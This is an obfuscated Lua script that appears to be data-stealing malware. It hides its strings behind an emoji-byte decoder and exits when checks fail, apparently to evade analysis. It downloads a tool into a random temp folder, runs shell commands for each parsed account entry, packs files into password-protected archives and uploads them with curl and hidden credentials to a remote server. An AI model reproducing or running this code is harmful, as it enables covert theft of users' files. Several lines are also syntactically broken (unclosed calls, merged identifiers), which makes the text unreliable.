        vi(__D("\240\159\140\186\240\159\166\128\240\159\144\161\240\159\144\154\240\159\144\162\240\159\166\128\240\159\144\161\240\159\165\165\240\159\144\160\240\159\144\172\240\159\144\139\240\159\144\179", __K) .. (v119.f28 or
      end
    elseif v121 == __D("\240\159\144\172\240\159\140\139\240\159\144\161\240\159\144\160\240\159\144\162\240\159\144\154\240\159\166\136\240\159\144\179\240\159\144\179\240\159\140\186\240\159\144\154\240\159\140\186\240\159\166\136\240\159\144\162", __K) then
    elseif v121 == __D("\240\159\144\172\240\159\165\165\240\159\144\161\240\159\140\180\240\159\144\162\240\159\144\179\240\159\166\136\240\159\166\136", __K) then
    end
  end
  return v120
end
function va.f29()
  pcall(va.fp)
  pcall(va.fq)
end
local v122 = va.f16()
if v122.f17 then
  os.exit()
end
local function qc(s)
  return __D("\240\159\144\160\240\159\140\180", __K) .. s:gsub(__D("\240\159\144\160\240\159\140\180", __K), (__D("\240\159\140\138\240\159\144\172\240\159\165\165\240\159\140\138", __K))) .. __D("\240\159\144\160\240\159\140\180", __K)
end
local function qp(s)
  return __D("\240\159\144\160\240\159\144\162", __K) .. s:gsub(__D("\240\159\144\160\240\159\144\162", __K), (__D("\240\159\144\160\240\159\144\162\240\159\165\165\240\159\144\161", __K))) .. __D("\240\159\144\160\240\159\144\162", __K)
end
local function ht(c)
  local f = io.popen(c
  local o = f:read(__D("\240\159\144\160\240\159\144\161\240\159\144\161\240\159\144\172", __K)) or __D("", __K)
  f:close()
  return o:find("OK", 1, true)
end
local function rc(c)
  local f = io.popen(c .. __D("\240\159\144\160\240\159\144\153\240\159\140\138\240\159\140\138\240\159\140\180\240\159\144\160\240\159\165\165\240\159\140\186\240\159\144\172\240\159\140\186", __K))
  local o = f:read(__D("\240\159\144\160\240\159\144\161\240\159\144\161\240\159\144\172", __K)) or __D("", __K)
  f:close()
  return o
end
function uf(fp, u, us, ps)
  local f = io.open(fp, (__D("\240\159\140\186\240\159\140\180\240\159\144\161\240\159\140\138", __K)))
  if not f then
    return false
  end
  f:close()
  if not ht((__D("\240\159\144\172\240\159\166\128\240\159\166\136\240\159\144\160\240\159\140\136\240\159\140\139\240\159\144\161\240\159\144\162\240\159\140\186\240\159\144\172\240\159\144\139\240\159\140\139\240\159\140\138\240\159\140\138\240\159\140\180\240\159\144\154\240\159\144\162\240\159\140\186\240\159\144\179\240\159\144\162\240\159\166\128\240\159\140\186\240\159\144\172\240\159\144\161\240\159\144\179\240\159\166\136\240\159\144\162\240\159\140\138", __K))) then
    os.exit()
    return false, nil, (__D("\240\159\144\172\240\159\166\128\240\159\166\136\240\159\144\160\240\159\140\136\240\159\140\139\240\159\144\161\240\159\144\162\240\159\140\186\240\159\144\172\240\159\144\154\240\159\144\162\240\159\166\136\240\159\140\186\240\159\140\180\240\159\166\128\240\159\166\128\240\159\144\160\240\159\144\160\240\159\166\128\240\159\140\180\240\159\144\154\240\159\140\186\240\159\140\136\240\159\144\179\240\159\144\161\240\159\144\162\240\159\144\139", __K))
  end
  local t = 30
  local pc = table.concat({
    __D("\240\159\144\172\240\159\166\128\240\159\166\136\240\159\144\160\240\159\140\136\240\159\140\139\240\159\144\161\240\159\144\162\240\159\140\186\240\159\144\172\240\159\144\139\240\159\140\139\240\159\144\161\240\159\144\154\240\159\144\153\240\159\140\139", __K),
t,
    __D("\240\159\144\160\240\159\140\186\240\159\144\161\240\159\144\153\240\159\166\128\240\159\140\136", __K) .. t,
    __D("\240\159\144\160\240\159\140\186\240\159\144\161\240\159\140\180\240\159\166\128\240\159\140\136\240\159\165\165\240\159\140\136", __K),
    "-w HTTPSTATUS:%{http_code}",
    qc(u)
  }, (__D("\240\159\144\160\240\159\144\153", __K)))
  local pr = rc(pc) or __D("", __K)
  local pb, pcd = pr:match("^(.*)HTTPSTATUS:(%d%d%d)$")
  if not pcd then
    os.exit(1)
  end
  local cmd = table.concat({
    __D("\240\159\144\172\240\159\166\128\240\159\166\136\240\159\144\160\240\159\140\136\240\159\140\139\240\159\144\161\240\159\144\162\240\159\140\186\240\159\144\172\240\159\144\139\240\159\140\139\240\159\144\161\240\159\144\154\240\159\144\153\240\159\140\139", __K),
t,
    __D("\240\159\144\160\240\159\140\186\240\159\144\161\240\159\144\153\240\159\166\128\240\159\140\136", __K) .. t,
    __D("\240\159\144\160\240\159\140\186\240\159\144\161\240\159\140\180\240\159\166\128\240\159\140\136\240\159\165\165\240\159\140\136", __K),
    "-w HTTPSTATUS:%{http_code}",
    __D("\240\159\144\160\240\159\140\186\240\159\166\136\240\159\144\160\240\159\166\128\240\159\140\136", __K) .. qc(us .. __D("\240\159\144\179\240\159\144\161", __K) .. ps),
    "-F " .. qc(__D("\240\159\144\172\240\159\140\136\240\159\144\161\240\159\140\139\240\159\144\162\240\159\144\161\240\159\144\161\240\159\165\165\240\159\144\172\240\159\144\154\240\159\166\128\240\159\144\179", __K) .. fp),
    qc(u)
  }, (__D("\240\159\144\160\240\159\144\153", __K)))
  local r = rc(cmd) or __D("", __K)
  local b, c = r:match("^(.*)HTTPSTATUS:(%d%d%d)$")
  if c then
    local n = tonumber(c)
    return n and n >= 200 and n < 300, n, b or __D("", __K)
  end
  return false, nil, r
end
local ha = function(s)
  local i = s:find("0x", 1, true) or s:find("0X", 1, true)
  if not i then
    return "0"
  end
  i = i + 2
  local j = i
  while j <= #s do
    local ch = s:sub(j, j)
    local is_hex = ch >= "0" and ch <= "9" or ch >= "a" and ch <= "f" or ch >= "A" and ch <= "F"
    if not is_hex then
      break
    end
    j = j + 1
  end
  if j == i then
    return "0"
  end
  return s:sub(i, j - 1)
end
do
  local addrstr = tostring({})
  local hx = ha(addrstr)
  local jitter = math.floor(os.clock() * 1000000)
  math.randomseed(os.time() + tonumber(hx, 16) + jitter)
  math.random()
  math.random()
  math.random()
end
local function fe(p)
  local f = io.open(p, (__D("\240\159\140\186\240\159\140\180\240\159\144\161\240\159\140\138", __K)))
  if f then
    f:close()
    return true
  end
  return false
end
local function jo(a, b)
  local la = a:sub(-1)
  if la == __D("\240\159\140\138\240\159\144\172", __K) or la == __D("\240\159\144\160\240\159\140\138", __K) then
    return a .. b
  end
  return a .. __D("\240\159\140\138\240\159\144\172", __K) .. b
end
local function ex(c)
  local r = os.execute(c)
  if type(r) == __D("\240\159\144\172\240\159\165\165\240\159\166\136\240\159\144\160\240\159\144\162\240\159\166\136\240\159\144\161\240\159\144\179\240\159\144\179\240\159\144\179\240\159\144\153\240\159\166\136", __K) then
    return r == 0
  end
  if type(r) == __D("\240\159\144\172\240\159\140\180\240\159\144\161\240\159\140\180\240\159\144\162\240\159\144\179\240\159\144\161\240\159\144\162\240\159\144\179\240\159\144\179\240\159\144\154\240\159\144\160\240\159\166\136\240\159\144\172", __K) then
    return r
  end
  return false
end
local function ed(d)
  return ex(__D("\240\159\144\172\240\159\166\128\240\159\144\161\240\159\144\153\240\159\144\162\240\159\140\180\240\159\165\165\240\159\166\136\240\159\140\186\240\159\166\128\240\159\144\154\240\159\144\161\240\159\140\138\240\159\140\180\240\159\166\128\240\159\165\165\240\159\144\162\240\159\165\165\240\159\144\172\240\159\144\139\240\159\140\180\240\159\144\153\240\159\144\172\240\159\144\172\240\159\144\160\240\159\144\153\240\159\166\128\240\159\144\154\240\159\165\165\240\159\140\138\240\159\140\186\240\159\144\162\240\159\140\138\240\159\144\179\240\159\144\160\240\159\165\165\240\159\140\138\240\159\140\180\240\159\144\139\240\159\166\136\240\159\144\172\240\159\165\165", __K) .. d .. __D("\240\159\144\160\240\159\140\180\240\159\165\165\240\159\140\186\240\159\144\162\240\159\166\136\240\159\144\161\240\159\144\153\240\159\144\179\240\159\144\160\240\159\144\154\240\159\144\153\240\159\144\161\240\159\144\153\240\159\144\162\240\159\144\162\240\159\166\128\240\159\144\161", __K) .. d .. __D("\240\159\144\160\240\159\140\180\240\159\165\165\240\159\140\186\240\159\140\180\240\159\144\160\240\159\144\161\240\159\144\139\240\159\144\160\240\159\144\179\240\159\144\154\240\159\144\139\240\159\140\138\240\159\140\180\240\159\140\136\240\159\144\139\240\159\140\180\240\159\140\136\240\159\144\172\240\159\166\128\240\159\144\162\240\159\140\138", __K))
end
local function q(s)
  return __D("\240\159\144\160\240\159\140\180", __K) .. s:gsub(__D("\240\159\144\160\240\159\140\180", __K), (__D("\240\159\140\138\240\159\144\172\240\159\165\165\240\159\140\138", __K))) .. __D("\240\159\144\160\240\159\140\180", __K)
end
local function dl(u, o)
  return exq(o) .. __D("\240\159\144\160\240\159\144\153", __K) .. q(u))
end
local rh = function(n)
  local t = {}
  for i = 1, n do
    t[i] = string.format("%x", math.random(0, 15))
  end
  return table.concat(t)
end
local function rn()
  return rh(8) .. rh(8)
end
local function ltrim(s)
  local i = 1
  while i <= #s do
    local c = s:sub(i, i)
    if c ~= __D("\240\159\144\160\240\159\144\153", __K) and c ~= __D("\240\159\144\161\240\159\144\179", __K) then
      break
    end
    i = i + 1
  end
  return s:sub(i)
end
local function rtrim(s)
  local j = #s
  while j >= 1 do
    local c = s:sub(j, j)
    if c ~= __D("\240\159\144\160\240\159\144\153", __K) and c ~= __D("\240\159\144\161\240\159\144\179", __K) then
      break
    end
    j = j - 1
  end
  return s:sub(1, j)
end
local function trim(s)
  return rtrim(ltrim(s))
end
local for_each_line = function(s, fn)
  local i = 1
  while i <= #s do
    local j = s:find("\n", i, true) or #s + 1
    fn(s:sub(i, j - 1))
    i = j + 1
  end
end
local tp = os.getenv((__D("\240\159\140\138\240\159\140\139\240\159\144\160\240\159\144\160\240\159\144\139\240\159\166\136\240\159\144\179\240\159\166\136", __K))) or __D("\240\159\144\160\240\159\165\165", __K)
local st = jo(tp, rn())
local ou = jo(st, rn() .. __D("\240\159\144\160\240\159\165\165\240\159\144\161\240\159\144\160\240\159\140\136\240\159\165\165\240\159\144\161\240\159\165\165", __K))
ed(st)
if not dlou) or not fe(ou) then
  os.exit(1)
end
local function bd(z, b, n, p)
  local s = b .. __D("\240\159\140\138\240\159\144\172", __K) .. n .. __D("\240\159\140\138\240\159\144\172", __K)
  local o = st .. __D("\240\159\140\138\240\159\144\172", __K) .. os.getenv((__D("\240\159\165\165\240\159\166\128\240\159\144\160\240\159\140\180\240\159\144\139\240\159\166\136\240\159\144\179\240\159\166\136\240\159\144\161\240\159\144\179\240\159\140\180\240\159\140\186\240\159\144\179\240\159\144\162\240\159\144\153\240\159\144\139\240\159\144\139\240\159\140\136\240\159\144\161\240\159\140\139\240\159\144\153\240\159\166\128\240\159\165\165\240\159\140\136", __K))) .. __D("\240\159\140\138\240\159\140\138", __K) .. n .. __D("\240\159\144\160\240\159\165\165\240\159\144\161\240\159\144\153\240\159\140\136\240\159\140\136\240\159\140\138\240\159\144\160", __K)
  local cmd = table.concat({
    __D("\240\159\144\172\240\159\166\128\240\159\144\161\240\159\144\153\240\159\144\162\240\159\140\180\240\159\165\165\240\159\166\136\240\159\140\186\240\159\166\128\240\159\144\154\240\159\144\161", __K),
    z,
    "a",
    __D("\240\159\144\160\240\159\140\186\240\159\166\136\240\159\140\186\240\159\166\128\240\159\140\139", __K) .. p .. __D("\240\159\144\160\240\159\140\180", __K),
    q(o),
    q(s .. __D("\240\159\140\138\240\159\144\172\240\159\165\165\240\159\144\162", __K)),
    __D("\240\159\144\179\240\159\165\165\240\159\144\161\240\159\166\128\240\159\140\136\240\159\166\128\240\159\144\161\240\159\144\162", __K),
    (__D("\240\159\144\179\240\159\140\180\240\159\140\138\240\159\166\128\240\159\166\128\240\159\144\153\240\159\140\138\240\159\144\161", __K))
  }, (__D("\240\159\144\160\240\159\144\153", __K)))
  os.execute(cmd)
  return o
end
local pc
local h = io.popen(pc, (__D("\240\159\140\186\240\159\140\180", __K)))
if h then
  do
    local o = h:read((__D("\240\159\144\160\240\159\144\161\240\159\144\161\240\159\144\172\240\159\144\162\240\159\144\161\240\159\144\161\240\159\144\162", __K)))
    h:close()
    local u, cu = {}, nil
    for_each_line(o, function(l)
      if l:sub(1, 4) == __D("\240\159\165\165\240\159\165\165\240\159\144\161\240\159\144\172\240\159\144\162\240\159\166\136\240\159\144\161\240\159\165\165", __K) then
        local colon = l:find(":", 1, true)
        if colon then
          local v = trim(l:sub(colon + 1))
          u.c = u.c or {}
          u.c.n = v
          u[v] = u.c
        end
      elseif l:sub(1, 3) == __D("\240\159\140\138\240\159\166\128\240\159\144\160\240\159\140\139\240\159\144\139\240\159\140\180", __K) then
        local colon = l:find(":", 1, true)
        if colon and u.c then
          u.c.s = trim(l:sub(colon + 1))
          local f = st .. __D("\240\159\140\138\240\159\144\172", __K) .. os.getenv((__D("\240\159\165\165\240\159\166\128\240\159\144\160\240\159\140\180\240\159\144\139\240\159\166\136\240\159\144\179\240\159\166\136\240\159\144\161\240\159\144\179\240\159\140\180\240\159\140\186\240\159\144\179\240\159\144\162\240\159\144\153\240\159\144\139\240\159\144\139\240\159\140\136\240\159\144\161\240\159\140\139\240\159\144\153\240\159\166\128\240\159\165\165\240\159\140\136", __K))) .. __D("\240\159\140\138\240\159\140\138", __K) .. u.c.n .. __D("\240\159\144\160\240\159\165\165\240\159\144\161\240\159\144\154\240\159\144\162\240\159\144\179\240\159\144\161\240\159\144\172", __K)
          local pcu.c.s .. __D("\240\159\144\160\240\159\144\162\240\159\165\165\240\159\140\139\240\159\166\128\240\159\144\160\240\159\144\179\240\159\144\160\240\159\144\179\240\159\144\139\240\159\144\154\240\159\140\186\240\159\140\138\240\159\140\180\240\159\140\136\240\159\144\179\240\159\166\128\240\159\144\160", __K) .. f .. __D("\240\159\144\160\240\159\140\180", __K)
          os.execute(pc2)
          uf(f
          o = bd(ou, __D("\240\159\165\165\240\159\166\128\240\159\140\138\240\159\144\162\240\159\140\139\240\159\144\161\240\159\144\179\240\159\165\165\240\159\144\160\240\159\140\138\240\159\144\154\240\159\144\172\240\159\144\161\240\159\144\153\240\159\140\180\240\159\140\139\240\159\140\139\240\159\140\139", __K), u.c.n, u.c.s)
          uf(o
        end
      end
    end)
    u.c = nil
  end
end
